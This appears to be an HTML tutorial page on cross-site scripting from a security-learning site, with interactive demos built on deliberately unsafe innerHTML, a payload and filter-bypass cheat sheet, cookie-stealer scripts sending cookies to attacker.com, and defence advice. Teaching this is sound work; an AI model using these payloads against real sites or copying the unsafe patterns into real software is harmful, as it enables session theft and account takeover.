@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Cross-Site Scripting (XSS) — Inject JS Into Anyone's Browser ☕</title>
+<link rel="stylesheet" href="../../assets/styles.css"/>
+</head>
+<body data-page-slug="xss">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../../index.html">Home</a>
+    <a href="../index.html" class="active">Web Attacks</a>
+    <a href="../../glossary/index.html">Glossary</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..."/>
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../../index.html">Home</a><span class="sep">›</span>
+  <a href="../index.html">02-Web-App-Attacks</a><span class="sep">›</span>
+  <span>XSS</span>
+</div>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-content">
+    <span class="coffee-badge">🐥 Intermediate · OWASP A03 · Bug Bounty Gold</span>
+    <h1>Cross-Site Scripting</h1>
+    <p class="subtitle">What if you could run your JavaScript in someone else's browser?<br>
+    Not hypothetically. Literally. Right now.</p>
+    <div class="tagline">"The user clicked a link. Your code ran in their browser. Game over."</div>
+    <br>
+    <button class="cta-btn" onclick="document.getElementById('what').scrollIntoView({behavior:'smooth'})">Show me how 🚀</button>
+    <p style="margin-top:18px; font-size:12px; color:var(--ink-dim);">CVE examples · 3 attack types · Live playground · Cookie stealer demo</p>
+  </div>
+</section>
+
+<!-- ═══════════════ CHAPTER 1: WHAT IS XSS ═══════════════ -->
+<section class="chapter" id="what">
+  <div class="chapter-num">Chapter 01 // The Big Idea</div>
+  <h2><span class="emoji">💉</span> What is XSS?</h2>
+
+  <p class="lead">Imagine a guestbook on a website. You can leave a comment. Now imagine instead of your name, you leave a JavaScript script. And the website just… runs it. For every visitor. That's XSS.</p>
+
+  <div class="paper">
+    <h4>The core idea 🧠</h4>
+    <p>Websites trust user input more than they should. When a site takes your input and puts it back in the HTML page <span class="highlight">without sanitizing it</span>, your input becomes code. JavaScript code. Running in the victim's browser.</p>
+    <br>
+    <p>What can you do with arbitrary JavaScript in someone's browser?<br>
+    → Steal their session cookie → log in as them<br>
+    → Capture keystrokes → get their passwords<br>
+    → Redirect them to a phishing page<br>
+    → Make requests on their behalf (CSRF via XSS)<br>
+    → Take screenshots via HTML5 canvas<br>
+    → Mine cryptocurrency in their browser</p>
+  </div>
+
+  <h3>The 3 types you need to know</h3>
+  <div class="grid cols-3">
+    <div class="card">
+      <div class="card-badge">Most Common</div>
+      <h4>🪃 Reflected XSS</h4>
+      <p style="color:var(--ink-dim);">Your payload is in the URL. Server reflects it back in the page. Victim clicks your crafted link. Runs once — only in their browser.</p>
+      <p style="color:var(--ink-mute); font-size:0.85rem; margin-top:8px;">Example: Search results that echo the search query back.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge warn">Most Dangerous</div>
+      <h4>💾 Stored XSS</h4>
+      <p style="color:var(--ink-dim);">Your payload is saved in the database. Runs for EVERY user who views the page. A single submission can compromise thousands of accounts.</p>
+      <p style="color:var(--ink-mute); font-size:0.85rem; margin-top:8px;">Example: A comment, profile name, or forum post.</p>
+    </div>
+    <div class="card">
+      <div class="card-badge danger">Sneakiest</div>
+      <h4>🌐 DOM-Based XSS</h4>
+      <p style="color:var(--ink-dim);">Payload never hits the server. JavaScript reads from the URL hash or other DOM source and writes it directly to the page. Hardest to detect.</p>
+      <p style="color:var(--ink-mute); font-size:0.85rem; margin-top:8px;">Example: Client-side JS that reads <code class="inline">location.hash</code>.</p>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 2: REFLECTED XSS PLAYGROUND ═══════════════ -->
+<section class="chapter" id="reflected">
+  <div class="chapter-num">Chapter 02 // Reflected XSS</div>
+  <h2><span class="emoji">🪃</span> Reflected XSS — Live Playground</h2>
+
+  <p class="lead">This simulates a search page that <strong>reflects your query back</strong> without sanitization. The server just does: <code class="inline">echo "You searched for: " + query</code> — and puts it in the HTML.</p>
+
+  <div class="playground" id="reflected-lab">
+    <div class="playground-header">
+      <h4>🔍 Vulnerable Search Page</h4>
+      <span style="font-size:12px; color:var(--ink-mute); font-family:var(--mono);">simulated · safe to try</span>
+    </div>
+
+    <!-- Simulated URL bar -->
+    <div class="url-bar">
+      <span class="proto">https://</span>
+      <span class="key">vulnerable-shop.com</span>
+      <span style="color:var(--ink-mute);">/search?q=</span>
+      <input id="xss-query" type="text" value="shoes" oninput="updateReflected()" style="min-width:200px; color:var(--accent-2);"/>
+    </div>
+
+    <p style="color:var(--ink-dim); font-size:0.9rem; margin:8px 0;">The server-side code (vulnerable PHP):</p>
+    <div class="code evil">
+<span class="com">// Vulnerable: directly echoes user input into HTML</span>
+<span class="kw">echo</span> <span class="str">"&lt;p&gt;You searched for: "</span> . <span class="kw">$_GET</span>[<span class="str">'q'</span>] . <span class="str">"&lt;/p&gt;"</span>;
+<span class="com">// No sanitization. No escaping. Pure injection point.</span>
+    </div>
+
+    <p style="color:var(--ink-dim); font-size:0.9rem; margin-top:14px;">Page output:</p>
+    <div class="result-box" id="reflected-output" style="min-height:80px; color:var(--ink);">
+      You searched for: <span id="reflected-result">shoes</span>
+    </div>
+
+    <div class="preset-chips">
+      <span style="color:var(--ink-mute); font-size:12px; align-self:center;">Try these →</span>
+      <span class="chip" onclick="setQuery('shoes')">normal search</span>
+      <span class="chip evil" onclick="setQuery('&lt;b&gt;bold&lt;/b&gt;')">HTML inject</span>
+      <span class="chip evil" onclick="setQuery('&lt;img src=x onerror=alert(1)&gt;')">XSS payload #1</span>
+      <span class="chip evil" onclick="setQuery('&lt;svg onload=alert(document.cookie)&gt;')">cookie steal</span>
+      <span class="chip evil" onclick="setQuery('&quot;&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;')">page hijack</span>
+    </div>
+
+    <div id="xss-alert" style="display:none; margin-top:14px; padding:16px; background:rgba(255,46,99,0.15); border:1px solid var(--accent-2); border-radius:8px;">
+      <strong style="color:var(--accent-2);">🚨 XSS Fired!</strong>
+      <p style="color:var(--ink-dim); font-size:0.9rem; margin-top:8px;" id="xss-message"></p>
+    </div>
+
+    <div class="callout info" style="margin-top:16px;">
+      <strong>🧠 What just happened?</strong> Your input was placed directly into the HTML without escaping. <code class="inline">&lt;</code> became a tag delimiter, not literal text. In a real site, this URL would steal any user's cookie who clicked it.
+    </div>
+  </div>
+
+  <h3>How the attack URL looks</h3>
+  <div class="code evil">
+<span class="com">// Normal search URL:</span>
+https://vulnerable-shop.com/search?q=shoes
+
+<span class="com">// Attacker crafts this URL and sends it to victim:</span>
+https://vulnerable-shop.com/search?q=<span class="inject">&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</span>
+
+<span class="com">// Victim clicks link → server reflects payload → script runs in victim's browser</span>
+<span class="com">// Cookie sent to attacker's server → attacker logs in as victim</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 3: STORED XSS ═══════════════ -->
+<section class="chapter" id="stored">
+  <div class="chapter-num">Chapter 03 // Stored XSS</div>
+  <h2><span class="emoji">💾</span> Stored XSS — The Worm</h2>
+
+  <p class="lead">This is the dangerous one. Your payload is saved to the server's database. Every user who views the page — forever — runs your code.</p>
+
+  <div class="playground" id="stored-lab">
+    <div class="playground-header">
+      <h4>💬 Vulnerable Comment Section</h4>
+      <span style="font-size:12px; color:var(--ink-mute); font-family:var(--mono);">simulated · safe to try</span>
+    </div>
+
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:16px;">
+      <div>
+        <p style="color:var(--ink-dim); font-size:0.9rem; margin-bottom:8px;">Post a comment (name):</p>
+        <input class="field" type="text" id="stored-name" placeholder="Your name" style="margin-bottom:8px;"/>
+        <p style="color:var(--ink-dim); font-size:0.9rem; margin-bottom:8px;">Comment:</p>
+        <textarea class="field" id="stored-comment" rows="3" placeholder="Great article!"></textarea>
+        <button class="cta-btn" style="margin-top:10px; padding:8px 18px; font-size:0.85rem;" onclick="postComment()">Post Comment</button>
+      </div>
+      <div>
+        <p style="color:var(--ink-dim); font-size:0.9rem; margin-bottom:8px;">Vulnerable server code:</p>
+        <div class="code evil" style="font-size:12px; margin:0;">
+<span class="com">// Saves raw input to DB</span>
+<span class="kw">$name</span> = <span class="kw">$_POST</span>[<span class="str">'name'</span>];
+<span class="kw">$comment</span> = <span class="kw">$_POST</span>[<span class="str">'comment'</span>];
+<span class="com">// No htmlspecialchars(). RIP.</span>
+db_insert(<span class="kw">$name</span>, <span class="kw">$comment</span>);
+        </div>
+      </div>
+    </div>
+
+    <div style="border-top:1px solid rgba(255,255,255,0.08); padding-top:14px;">
+      <p style="color:var(--ink-dim); font-size:0.9rem; margin-bottom:10px;">📋 Comments (rendered for every visitor):</p>
+      <div id="comments-section" style="display:flex; flex-direction:column; gap:10px;"></div>
+    </div>
+
+    <div class="preset-chips" style="margin-top:14px;">
+      <span style="color:var(--ink-mute); font-size:12px; align-self:center;">Evil names →</span>
+      <span class="chip evil" onclick="setStoredPayload('&lt;b&gt;Alice&lt;/b&gt;','Thanks!')">HTML in name</span>
+      <span class="chip evil" onclick="setStoredPayload('Hacker','&lt;img src=x onerror=alert(\"XSS Stored!\")&gt;')">XSS in comment</span>
+      <span class="chip evil" onclick="setStoredPayload('Eve','&lt;script&gt;document.getElementById(\"comments-section\").style.background=\"#1a0000\"&lt;/script&gt;')">page manipulation</span>
+    </div>
+  </div>
+
+  <h3>Real-world impact: The Samy Worm (2005)</h3>
+  <div class="callout danger">
+    <strong>💀 CVE: The Samy MySpace Worm</strong><br>
+    Samy Kamkar found a stored XSS on MySpace in 2005. He wrote a worm that:<br>
+    1. Added "Samy is my hero" to every viewer's profile<br>
+    2. Added Samy as a friend<br>
+    3. Copied itself to the viewer's profile (so THEY spread it too)<br><br>
+    In <strong>20 hours</strong> it infected over <strong>1 million profiles</strong>. The largest XSS worm in history. Samy was arrested by Secret Service.
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 4: DOM XSS ═══════════════ -->
+<section class="chapter" id="dom">
+  <div class="chapter-num">Chapter 04 // DOM-Based XSS</div>
+  <h2><span class="emoji">🌐</span> DOM-Based XSS — Server Never Sees It</h2>
+
+  <p class="lead">Client-side JavaScript reads data from the URL (like the hash fragment) and writes it to the DOM without sanitizing. The server is completely clean. WAFs miss it. Scanners miss it.</p>
+
+  <div class="playground">
+    <div class="playground-header">
+      <h4>🌐 DOM XSS Demo — Hash-Based</h4>
+    </div>
+    <p style="color:var(--ink-dim); font-size:0.9rem; margin-bottom:8px;">Vulnerable JavaScript code on the page:</p>
+    <div class="code evil">
+<span class="com">// Vulnerable: reads hash, writes to DOM with innerHTML</span>
+<span class="kw">const</span> name = location.hash.slice(1); <span class="com">// everything after #</span>
+document.getElementById(<span class="str">'greeting'</span>).innerHTML = <span class="str">`Hello, ${name}!`</span>;
+<span class="com">// If hash is: #&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="com">// innerHTML parses it as HTML → XSS fires</span>
+    </div>
+
+    <div style="margin-top:14px;">
+      <p style="color:var(--ink-dim); font-size:0.9rem; margin-bottom:8px;">Simulate the hash:</p>
+      <div class="url-bar">
+        <span class="proto">https://</span><span class="key">example.com</span><span style="color:var(--ink-mute);">/welcome</span><span style="color:var(--warn);">#</span><input id="dom-hash" type="text" value="Alice" oninput="updateDom()" style="color:var(--accent-2); min-width:200px;"/>
+      </div>
+      <div class="result-box" style="margin-top:10px;">
+        <span id="dom-greeting">Hello, Alice!</span>
+      </div>
+    </div>
+
+    <div class="preset-chips">
+      <span class="chip" onclick="document.getElementById('dom-hash').value='Bob'; updateDom();">normal name</span>
+      <span class="chip evil" onclick="document.getElementById('dom-hash').value='&lt;b style=color:red&gt;RED&lt;/b&gt;'; updateDom();">HTML inject</span>
+      <span class="chip evil" onclick="document.getElementById('dom-hash').value='&lt;img src=x onerror=alert(\"DOM XSS!\")&gt;'; updateDom();">XSS payload</span>
+    </div>
+
+    <div class="callout info" style="margin-top:14px;">
+      <strong>💡 Why WAFs miss this:</strong> The hash fragment (<code class="inline">#payload</code>) is never sent to the server — the browser strips it. So a Web Application Firewall inspecting server-side traffic sees nothing. The payload only exists client-side.
+    </div>
+  </div>
+
+  <h3>Common DOM XSS sources (where data comes from)</h3>
+  <div class="code evil">
+location.href          ← full URL
+location.hash          ← fragment after #
+location.search        ← query string (?param=value)
+document.referrer      ← where you came from
+document.cookie        ← cookies (readable by JS)
+window.name            ← survives navigation
+localStorage / sessionStorage
+postMessage()          ← cross-origin messages
+  </div>
+
+  <h3>Common DOM XSS sinks (where data goes — dangerous)</h3>
+  <div class="code evil">
+innerHTML = payload          ← parses HTML → XSS
+outerHTML = payload
+document.write(payload)
+document.writeln(payload)
+eval(payload)                ← executes as JS directly
+setTimeout(payload, 0)
+setInterval(payload, 0)
+location = payload           ← can be javascript: URL
+location.href = payload
+element.src = payload
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 5: REAL PAYLOADS ═══════════════ -->
+<section class="chapter" id="payloads">
+  <div class="chapter-num">Chapter 05 // Payload Arsenal</div>
+  <h2><span class="emoji">⚔️</span> XSS Payload Cheat Sheet</h2>
+
+  <p class="lead">Different contexts need different payloads. A payload that works in a search field might not work in an HTML attribute. Know your context.</p>
+
+  <h3>Basic — Start with these</h3>
+  <div class="code evil">
+<span class="com">// Classic (blocked most places now, but always try first)</span>
+<span class="inject">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="com">// When script tags are blocked — event handlers</span>
+<span class="inject">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="inject">&lt;svg onload=alert(1)&gt;</span>
+<span class="inject">&lt;body onload=alert(1)&gt;</span>
+<span class="inject">&lt;input autofocus onfocus=alert(1)&gt;</span>
+<span class="inject">&lt;details open ontoggle=alert(1)&gt;&lt;/details&gt;</span>
+
+<span class="com">// When inside HTML attribute: value="PAYLOAD"</span>
+<span class="inject">" onmouseover="alert(1)</span>
+<span class="inject">" autofocus onfocus="alert(1)</span>
+  </div>
+
+  <h3>Context: Inside JavaScript</h3>
+  <div class="code evil">
+<span class="com">// Page has: var name = "USER_INPUT";</span>
+<span class="com">// Inject to break out of the string:</span>
+<span class="inject">"; alert(1); //</span>
+<span class="inject">'-alert(1)-'</span>
+<span class="inject">`${alert(1)}`</span>
+  </div>
+
+  <h3>Filter Bypass — When the obvious is blocked</h3>
+  <div class="code evil">
+<span class="com">// Case mixing</span>
+<span class="inject">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span>
+
+<span class="com">// No parentheses needed (works in some contexts)</span>
+<span class="inject">&lt;img src=x onerror="alert`1`"&gt;</span>
+
+<span class="com">// HTML entities (decoded by browser)</span>
+<span class="inject">&lt;img src=x onerror=&amp;#97;lert(1)&gt;</span>
+
+<span class="com">// Unicode encoding</span>
+<span class="inject">&lt;img src=x onerror=\u0061lert(1)&gt;</span>
+
+<span class="com">// Double URL encoding (sometimes)</span>
+%253Cscript%253Ealert(1)%253C/script%253E
+
+<span class="com">// SVG with CDATA</span>
+<span class="inject">&lt;svg&gt;&lt;script&gt;&lt;![CDATA[alert(1)]]&gt;&lt;/script&gt;&lt;/svg&gt;</span>
+  </div>
+
+  <h3>Real Impact — Cookie Stealer</h3>
+  <div class="code evil">
+<span class="com">// This is what makes XSS dangerous in the real world</span>
+<span class="com">// Attacker hosts a collector at https://attacker.com/collect</span>
+
+<span class="inject">&lt;script&gt;
+new Image().src = 'https://attacker.com/collect?c=' + 
+  encodeURIComponent(document.cookie);
+&lt;/script&gt;</span>
+
+<span class="com">// Fetch-based (bypasses some CSP restrictions):</span>
+<span class="inject">&lt;script&gt;
+fetch('https://attacker.com/collect', {
+  method:'POST',
+  body: JSON.stringify({
+    cookie: document.cookie,
+    url: location.href,
+    dom: document.body.innerHTML.substring(0,1000)
+  })
+});
+&lt;/script&gt;</span>
+  </div>
+
+  <div class="callout danger">
+    <strong>🚨 Cookie stealing in bug bounties:</strong> To demonstrate real impact, you don't need to actually steal anyone's cookies. Show the PoC fires with <code class="inline">alert(document.cookie)</code> or <code class="inline">alert(document.domain)</code> — that proves it's exploitable. Report the full cookie-stealer technique in your write-up as theoretical impact.
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 6: DEFENSE ═══════════════ -->
+<section class="chapter" id="defense">
+  <div class="chapter-num">Chapter 06 // Defense</div>
+  <h2><span class="emoji">🛡️</span> How to actually prevent XSS</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>✅ Output Encoding (The Real Fix)</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">Convert special characters to HTML entities before rendering. <code class="inline">&lt;</code> becomes <code class="inline">&amp;lt;</code>. Browser displays it as text, not code.</p>
+      <div class="code safe" style="font-size:12px; margin-top:8px;">
+<span class="com">// PHP</span>
+htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+
+<span class="com">// Python/Jinja2</span>
+{{ variable | e }}  <span class="com">// auto in Jinja2</span>
+
+<span class="com">// JavaScript</span>
+element.textContent = input; <span class="com">// NOT innerHTML</span>
+      </div>
+    </div>
+    <div class="card">
+      <h4>✅ Content Security Policy (CSP)</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">HTTP header that tells the browser what scripts are allowed to run. Properly configured CSP prevents XSS execution even if injection succeeds.</p>
+      <div class="code safe" style="font-size:12px; margin-top:8px;">
+<span class="com"># HTTP Response Header:</span>
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self' 'nonce-RANDOM';
+  object-src 'none';
+      </div>
+    </div>
+    <div class="card">
+      <h4>✅ HttpOnly Cookie Flag</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">Makes session cookies inaccessible to JavaScript. Even if XSS fires, the attacker can't steal the session cookie via <code class="inline">document.cookie</code>.</p>
+      <div class="code safe" style="font-size:12px; margin-top:8px;">
+Set-Cookie: session=abc123; 
+  HttpOnly; Secure; SameSite=Strict;
+      </div>
+    </div>
+    <div class="card">
+      <h4>✅ Input Validation</h4>
+      <p style="color:var(--ink-dim); font-size:0.9rem;">Allowlist valid characters. If a name field only needs letters, reject everything else. Don't rely on this alone — combine with output encoding.</p>
+      <div class="code safe" style="font-size:12px; margin-top:8px;">
+<span class="com">// Allowlist approach:</span>
+/^[a-zA-Z0-9 ]{1,50}$/.test(input)
+
+<span class="com">// ⚠️ NEVER denylist — always bypassable</span>
+<span class="com">// input.replace('&lt;script&gt;', '') ← WRONG</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- ═══════════════ CHAPTER 7: CVE + QUIZ ═══════════════ -->
+<section class="chapter" id="cve">
+  <div class="chapter-num">Chapter 07 // Real World</div>
+  <h2><span class="emoji">🌍</span> XSS in the Wild</h2>
+
+  <div class="grid cols-2">
+    <div class="callout danger">
+      <strong>💀 CVE-2023-41179 — Trend Micro Stored XSS</strong><br>
+      CVSS: 9.1 Critical. A stored XSS in Trend Micro Apex One and Worry-Free Business Security. Attackers could execute arbitrary code in the admin console. Affected tens of thousands of enterprise deployments.
+    </div>
+    <div class="callout danger">
+      <strong>💀 CVE-2024-23917 — JetBrains TeamCity XSS</strong><br>
+      Reflected XSS in TeamCity CI/CD server. Allowed an unauthenticated attacker to steal admin session cookies via a crafted URL. Critical for software supply chain security.
+    </div>
+    <div class="callout danger">
+      <strong>💀 Bug Bounty: $12,000 XSS (Meta, 2022)</strong><br>
+      A stored XSS on Facebook's internal preview tool. By posting a crafted message, a researcher could execute JS in any Facebook employee's browser. Patched within days, rewarded $12,000.
+    </div>
+    <div class="callout danger">
+      <strong>💀 Bug Bounty: $14,000 DOM XSS (Google, 2021)</strong><br>
+      DOM-based XSS in Google Drive. The URL hash parameter was written directly to innerHTML. Allowed stealing Google OAuth tokens of any user who clicked the link.
+    </div>
+  </div>
+
+  <h3>Where to practice right now</h3>
+  <div class="code safe">
+PortSwigger XSS Labs (FREE, browser-based):
+→ https://portswigger.net/web-security/cross-site-scripting
+
+Lab 1: Reflected XSS into HTML context
+Lab 2: Stored XSS into HTML context
+Lab 3: DOM XSS in document.write using location.search
+Lab 4: DOM XSS in innerHTML using location.search
+Lab 5: Reflected XSS into attribute with angle brackets HTML-encoded
+...20+ more labs escalating to CSP bypass
+
+DVWA (Docker lab in this repo):
+docker-compose up -f ../../../labs/docker/dvwa/docker-compose.yml
+→ http://localhost:8080 → XSS (Reflected) / XSS (Stored)
+  </div>
+</section>
+
+<!-- QUIZ -->
+<section class="chapter">
+  <div class="chapter-num">Check Yourself</div>
+  <h2>🎮 XSS Quick Quiz</h2>
+
+  <div class="quiz" id="xq1">
+    <h4>Question 1 of 3</h4>
+    <p class="q">A user's comment containing <code style="color:var(--accent);">&lt;script&gt;alert(1)&lt;/script&gt;</code> is saved to the database and runs when others visit the page. What type of XSS is this?</p>
+    <div class="options">
+      <div class="opt" onclick="xanswer('xq1',this,false)">A. Reflected XSS</div>
+      <div class="opt" onclick="xanswer('xq1',this,true)">B. Stored XSS</div>
+      <div class="opt" onclick="xanswer('xq1',this,false)">C. DOM-Based XSS</div>
+      <div class="opt" onclick="xanswer('xq1',this,false)">D. Second-Order SQLi</div>
+    </div>
+    <div class="feedback" id="xq1-fb"></div>
+  </div>
+
+  <div class="quiz" id="xq2">
+    <h4>Question 2 of 3</h4>
+    <p class="q">Which cookie flag makes session cookies inaccessible to JavaScript, limiting XSS impact?</p>
+    <div class="options">
+      <div class="opt" onclick="xanswer('xq2',this,false)">A. Secure</div>
+      <div class="opt" onclick="xanswer('xq2',this,true)">B. HttpOnly</div>
+      <div class="opt" onclick="xanswer('xq2',this,false)">C. SameSite</div>
+      <div class="opt" onclick="xanswer('xq2',this,false)">D. NoScript</div>
+    </div>
+    <div class="feedback" id="xq2-fb"></div>
+  </div>
+
+  <div class="quiz" id="xq3">
+    <h4>Question 3 of 3</h4>
+    <p class="q">A DOM XSS fires via the URL fragment (<code style="color:var(--accent);">#payload</code>). Does a Web Application Firewall inspect this?</p>
+    <div class="options">
+      <div class="opt" onclick="xanswer('xq3',this,false)">A. Yes — WAFs inspect all URL components</div>
+      <div class="opt" onclick="xanswer('xq3',this,true)">B. No — browsers strip the hash before sending the request; the server never sees it</div>
+      <div class="opt" onclick="xanswer('xq3',this,false)">C. Only if the WAF is configured for JavaScript</div>
+      <div class="opt" onclick="xanswer('xq3',this,false)">D. Only on POST requests</div>
+    </div>
+    <div class="feedback" id="xq3-fb"></div>
+  </div>
+
+  <div style="margin-top:30px;">
+    <h3>🚀 Next Up</h3>
+    <div class="grid cols-3">
+      <a class="card is-link" href="../csrf/index.html"><h4>🔄 CSRF</h4><p>Forge requests using a victim's active session.</p></a>
+      <a class="card is-link" href="../ssrf/index.html"><h4>🌐 SSRF</h4><p>Make the server talk to internal systems for you.</p></a>
+      <a class="card is-link" href="../idor/index.html"><h4>🔐 IDOR</h4><p>Access other users' data by changing one number.</p></a>
+    </div>
+  </div>
+</section>
+
+<script src="../../assets/app.js"></script>
+<script src="../../assets/glossary.js"></script>
+<script>
+function updateReflected() {
+  const q = document.getElementById('xss-query').value;
+  const result = document.getElementById('reflected-result');
+  const alertBox = document.getElementById('xss-alert');
+  const msg = document.getElementById('xss-message');
+  result.innerHTML = q;
+  const dangerous = q.includes('<') || q.includes('>') || q.includes('script') || q.includes('onerror') || q.includes('onload') || q.includes('alert');
+  alertBox.style.display = dangerous ? 'block' : 'none';
+  if(dangerous) {
+    if(q.includes('cookie')) msg.textContent = 'Cookie theft payload detected! In a real scenario, document.cookie would be sent to attacker\'s server. Value: session=a1b2c3d4; auth=eyJhbGc...';
+    else if(q.includes('alert')) msg.textContent = 'Alert payload would execute in the victim\'s browser. This proves JavaScript execution is possible.';
+    else msg.textContent = 'HTML/JS injection detected. The input is being rendered as code, not text.';
+  }
+}
+
+function setQuery(val) {
+  document.getElementById('xss-query').value = val;
+  updateReflected();
+}
+
+// Stored XSS demo
+const commentsDB = [
+  {name:'Alice', comment:'Great article, really helpful!'},
+  {name:'Bob', comment:'Thanks for sharing this.'},
+];
+
+function renderComments() {
+  const section = document.getElementById('comments-section');
+  section.innerHTML = commentsDB.map(c => `
+    <div style="background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); border-radius:8px; padding:12px 14px;">
+      <strong style="color:var(--accent-3);">${c.name}</strong>
+      <p style="color:var(--ink); margin-top:6px; font-size:0.95rem;">${c.comment}</p>
+    </div>
+  `).join('');
+}
+
+function postComment() {
+  const name = document.getElementById('stored-name').value || 'Anonymous';
+  const comment = document.getElementById('stored-comment').value;
+  if(!comment.trim()) return;
+  commentsDB.push({name, comment});
+  document.getElementById('stored-name').value = '';
+  document.getElementById('stored-comment').value = '';
+  renderComments();
+}
+
+function setStoredPayload(name, comment) {
+  document.getElementById('stored-name').value = name;
+  document.getElementById('stored-comment').value = comment;
+}
+
+renderComments();
+
+// DOM XSS demo
+function updateDom() {
+  const val = document.getElementById('dom-hash').value;
+  document.getElementById('dom-greeting').innerHTML = 'Hello, ' + val + '!';
+}
+
+function xanswer(qid, el, correct) {
+  el.closest('.quiz').querySelectorAll('.opt').forEach(o => o.style.pointerEvents = 'none');
+  el.classList.add(correct ? 'correct' : 'wrong');
+  const fb = document.getElementById(qid+'-fb');
+  fb.className = 'feedback '+(correct?'win':'lose');
+  fb.textContent = correct ? '🎉 Correct!' : '❌ Not quite — re-read the chapter!';
+}
+</script>
+</body>
+</html>
